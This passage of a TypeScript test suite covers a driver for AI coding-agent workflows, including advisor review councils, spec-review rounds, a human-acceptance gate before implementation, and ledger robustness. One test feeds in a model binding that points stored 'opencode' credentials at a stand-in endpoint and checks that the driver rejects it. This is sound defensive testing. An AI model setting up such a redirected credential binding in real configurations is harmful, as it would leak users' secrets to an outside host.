    });
    const error = await runHarnessDriver(h.host, advisorInput, h.deps);
    expect(error).toBeNull();
    expect(h.ops.filter((o) => o.id === 'review')).toHaveLength(2);
    expect(fixPrompt).toContain('k3 spotted a race');
    expect(fixPrompt).toContain('harness/kimi');
  });

  it('fails the run when the advisor council op fails — with the op error surfaced', async () => {
    const h = makeHarness(dir);
    bindKimi(h);
    scriptCouncil(h, () => ({ ok: false, stderr: 'Reviewer kimi failed: subscription expired' }));
    const error = await runHarnessDriver(h.host, advisorInput, h.deps);
    expect(error).toMatch(/advisor council failed/);
    expect(error).toMatch(/subscription expired/);
    expect(h.calls.map((c) => c.id)).not.toContain('stage');
  });

  it('feature runs use pre-implementation councils before implementation', async () => {
    const h = makeHarness(dir);
    bindKimi(h);
    h.agentBehavior.set('spec', (req) => {
      // The real phase writes the spec into the worktree; the driver verifies it
      // is there before any council reviews it.
      mkdirSync(join(dir, '.ai', 'specs'), { recursive: true });
      writeFileSync(join(dir, '.ai', 'specs', 'feat.md'), '# feat\n', 'utf8');
      writeFileSync(
        req.resultPath,
        JSON.stringify({ summary: 'glass inbox spec', specPath: '.ai/specs/feat.md', files: ['.ai/specs/feat.md'] }),
        'utf8',
      );
      return null;
    });
    // Runner reviewer on the spec: round 1 objects, round 2 approves.
    let specReviews = 0;
    h.agentBehavior.set('spec-review', (req) => {
      specReviews += 1;
      writeFileSync(
        req.resultPath,
        JSON.stringify(
          specReviews === 1
            ? { verdict: 'request_changes', findings: [{ severity: 'blocker', title: 'spec misses rollback plan' }] }
            : { verdict: 'approve', findings: [] },
        ),
        'utf8',
      );
      return null;
    });
    h.agentBehavior.set('spec-2', (req) => {
      writeFileSync(
        req.resultPath,
        JSON.stringify({ summary: 'revised spec', specPath: '.ai/specs/feat.md', files: ['.ai/specs/feat.md'] }),
        'utf8',
      );
      return null;
    });
    // Advisor council ops arrive in order: spec r1, spec r2, implementation r1.
    const reviewArgs: string[][] = [];
    let opCount = 0;
    scriptCouncil(h, () => {
      opCount += 1;
      return {
        ok: true,
        result: {
          verdict: opCount === 1 ? 'request_changes' : 'approve',
          reviewers: [
            {
              id: 'kimi',
              family: 'moonshot',
              status: 'completed',
              review:
                opCount === 1
                  ? { verdict: 'request_changes', findings: [{ severity: 'major', title: 'k3: unclear migration' }] }
                  : { verdict: 'approve', findings: [] },
            },
          ],
        },
      };
    });
    const featureInput = { ...advisorInput, workflow: HARNESS_IMPLEMENT_FEATURE };
    const error = await runHarnessDriver(h.host, featureInput, h.deps);
    expect(error).toBeNull();
    const phaseOrder = h.calls.map((call) => call.id);
    const specReviewCalls = h.calls.filter(
      (call) => call.kind === 'agent' && call.id.startsWith('spec-review'),
    );
    expect(phaseOrder).not.toContain('pre-implement');
    expect(phaseOrder.indexOf('implement')).toBeGreaterThan(phaseOrder.indexOf('spec-review-2'));
    expect(specReviewCalls).toHaveLength(2);
    expect(specReviewCalls.every((call) => call.skill === 'om-pre-implement-spec')).toBe(true);
    expect(
      new Set(
        h.calls
          .filter((call) => call.kind === 'agent' && call.skill)
          .map((call) => call.skill),
      ),
    ).toEqual(
      new Set([
        'om-spec-writing',
        'om-pre-implement-spec',
        'om-implement-spec',
        'om-code-review',
      ]),
    );

    for (const o of h.ops) if (o.id === 'review') reviewArgs.push(o.args ?? []);
    expect(reviewArgs).toHaveLength(3); // spec ×2 rounds + implementation ×1
    // The spec council reviews the SPEC FILE, not the diff — as a verified copy.
    expect(reviewArgs[0]).toContain('--artifact');
    expect(reviewArgs[0]![reviewArgs[0]!.indexOf('--artifact') + 1]).toMatch(/spec-subject-r1\.md$/);
    expect(reviewArgs[2]).not.toContain('--artifact');
    const order = h.calls.map((c) => c.id);
    expect(order.indexOf('spec-2')).toBeGreaterThan(order.indexOf('spec-review'));
    expect(order.indexOf('implement')).toBeGreaterThan(order.indexOf('spec-2'));
    const ledger = loadLedger(h.host.dataDir, h.host.runId);
    expect((ledger?.councils ?? []).map((c) => (c as { kind?: string }).kind)).toEqual([
      'spec',
      'spec',
      'implementation',
    ]);
  });

  it('keeps the standalone pre-implementation gate for non-council workflows', async () => {
    const h = makeHarness(dir);
    h.agentBehavior.set('spec', (req) => {
      mkdirSync(join(dir, '.ai', 'specs'), { recursive: true });
      writeFileSync(join(dir, '.ai', 'specs', 'feat.md'), '# feature\n', 'utf8');
      writeFileSync(
        req.resultPath,
        JSON.stringify({
          summary: 'feature spec',
          specPath: '.ai/specs/feat.md',
          files: ['.ai/specs/feat.md'],
        }),
      );
      return null;
    });
    h.agentBehavior.set('pre-implement', (req) => {
      writeFileSync(
        req.resultPath,
        JSON.stringify({
          status: 'blocked',
          summary: 'migration rollback is unspecified',
          reportPath: 'pre-implement.md',
          findings: [
            {
              severity: 'blocker',
              title: 'No rollback contract',
              evidence: 'The spec changes persistence without a recovery path.',
            },
          ],
        }),
      );
      return null;
    });

    const error = await runHarnessDriver(
      h.host,
      { ...input, workflow: HARNESS_IMPLEMENT_FEATURE, roles: undefined },
      h.deps,
    );

    expect(error).toMatch(/explicit acceptance is required/);
    expect(h.calls.map((call) => call.id)).not.toContain('implement');
    expect(loadLedger(h.host.dataDir, h.host.runId)?.outcome.pendingDecision).toMatchObject({
      kind: 'spec',
      gate: 'pre-implement',
    });
  });

  // the decision's findings outgrew the ledger schema, so the next read was corrupt.
  it('keeps a pre-implementation decision with oversized findings readable', async () => {
    const h = makeHarness(dir);
    h.agentBehavior.set('spec', (req) => {
      mkdirSync(join(dir, '.ai', 'specs'), { recursive: true });
      writeFileSync(join(dir, '.ai', 'specs', 'feat.md'), '# feature\n', 'utf8');
      writeFileSync(
        req.resultPath,
        JSON.stringify({ summary: 'feature spec', specPath: '.ai/specs/feat.md', files: ['.ai/specs/feat.md'] }),
      );
      return null;
    });
    h.agentBehavior.set('pre-implement', (req) => {
      writeFileSync(
        req.resultPath,
        JSON.stringify({
          status: 'blocked',
          summary: 's'.repeat(19_000),
          reportPath: 'pre-implement.md',
          findings: Array.from({ length: 50 }, (_, i) => ({
            severity: 'major',
            title: `t${i} ${'x'.repeat(480)}`,
            evidence: 'e'.repeat(3_990),
          })),
        }),
      );
      return null;
    });

    const error = await runHarnessDriver(
      h.host,
      { ...input, workflow: HARNESS_IMPLEMENT_FEATURE, roles: undefined },
      h.deps,
    );

    expect(error).toMatch(/explicit acceptance is required/);
    const read = readLedger(h.host.dataDir, h.host.runId);
    expect(read.status).toBe('valid');
    if (read.status !== 'valid') return;
    const decision = read.ledger.outcome.pendingDecision;
    expect(decision?.kind).toBe('spec');
    if (decision?.kind !== 'spec') return;
    expect(decision.findings).toHaveLength(50);
    expect(Math.max(...decision.findings.map((f) => f.length))).toBe(4_000);
  });

  it('keeps a blocked pre-implementation audit with only an oversized summary readable', async () => {
    const h = makeHarness(dir);
    h.agentBehavior.set('spec', (req) => {
      mkdirSync(join(dir, '.ai', 'specs'), { recursive: true });
      writeFileSync(join(dir, '.ai', 'specs', 'feat.md'), '# feature\n', 'utf8');
      writeFileSync(
        req.resultPath,
        JSON.stringify({ summary: 'feature spec', specPath: '.ai/specs/feat.md', files: ['.ai/specs/feat.md'] }),
      );
      return null;
    });
    h.agentBehavior.set('pre-implement', (req) => {
      writeFileSync(
        req.resultPath,
        JSON.stringify({ status: 'blocked', summary: 'z'.repeat(9_000), reportPath: 'r.md', findings: [] }),
      );
      return null;
    });

    await runHarnessDriver(h.host, { ...input, workflow: HARNESS_IMPLEMENT_FEATURE, roles: undefined }, h.deps);

    expect(readLedger(h.host.dataDir, h.host.runId).status).toBe('valid');
  });

  it('preflights an unbound advisor to a clean setup hint, before any op runs', async () => {
    const h = makeHarness(dir); // default loadAgentic: no agentHarness at all
    const error = await runHarnessDriver(h.host, advisorInput, h.deps);
    expect(error).toMatch(/advisor reviewer "kimi" is not bound/);
    expect(h.calls.map((c) => c.id)).not.toContain('capture');
  });

  it('rejects a redirected advisor auth-store binding before probing or running an op', async () => {
    const h = makeHarness(dir);
    const agentHarness = {
      models: {
        kimi: {
          adapter: 'preset',
          preset: 'opencode-zen',
          family: 'moonshot',
          model: 'kimi-code/k3',
          roles: ['reviewer'],
          endpoint: 'https://example.invalid/completions',
          authStoreProvider: 'opencode',
        },
      },
      profiles: {},
    };
    h.deps.loadAgentic = async () => ({
      baseBranch: 'main',
      validationCommands: ['echo ok'],
      agentHarness,
    });
    h.deps.createProber = () => {
      throw new Error('advisor probe must not run for a rejected credential binding');
    };

    const error = await runHarnessDriver(h.host, advisorInput, h.deps);

    expect(error).toMatch(/official preset, provider, and endpoint/);
    expect(h.calls.map((c) => c.id)).not.toContain('capture');
  });

  it('falls back to the repo working tree config when the base carries no agentHarness (staged setup)', async () => {
    const h = makeHarness(dir); // dir = the run worktree
    const root = mkdtempSync(join(tmpdir(), 'cez-driver-root-'));
    try {
      const agentHarness = {
        models: { kimi: { roles: ['reviewer'], family: 'moonshot', timeoutMs: 60_000 } },
        profiles: {},
      };
      mkdirSync(join(root, '.ai'), { recursive: true });
      writeFileSync(join(root, '.ai', 'agentic.config.json'), JSON.stringify({ agentHarness }), 'utf8');
      execFileSync('git', ['init'], { cwd: root, stdio: 'ignore' });
      execFileSync('git', ['add', '.ai/agentic.config.json'], { cwd: root });
      h.host.repoRoot = root;
      h.deps.loadAgentic = async (cwd: string) =>
        cwd === root
          ? { baseBranch: 'main', validationCommands: ['echo ok'], agentHarness }
          : { baseBranch: 'main', validationCommands: ['echo ok'], agentHarness: undefined };
      scriptCouncil(h, () => ({
        ok: true,
        result: {
          verdict: 'approve',
          reviewers: [{ id: 'kimi', family: 'moonshot', status: 'completed', review: { verdict: 'approve', findings: [] } }],
        },
      }));
      const error = await runHarnessDriver(h.host, advisorInput, h.deps);
      expect(error).toBeNull();

      const review = h.ops.find((o) => o.id === 'review');
      const configPath = review!.args![review!.args!.indexOf('--config') + 1]!;
      const synthesized = JSON.parse(readFileSync(configPath, 'utf8')) as {
        agentHarness: { models: Record<string, { family?: string }>; profiles: Record<string, { reviewers: string[] }> };
      };
      expect(synthesized.agentHarness.models.kimi?.family).toBe('moonshot');
      expect(synthesized.agentHarness.profiles['cez-role-council']?.reviewers).toEqual(['kimi']);

      const ledger = loadLedger(h.host.dataDir, h.host.runId);
      expect(ledger?.trustedConfig?.baseRef).toContain('working-tree');
      expect(h.events.some((e) => e.type === 'note' && String(e.message).includes('staged'))).toBe(true);
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  });
});
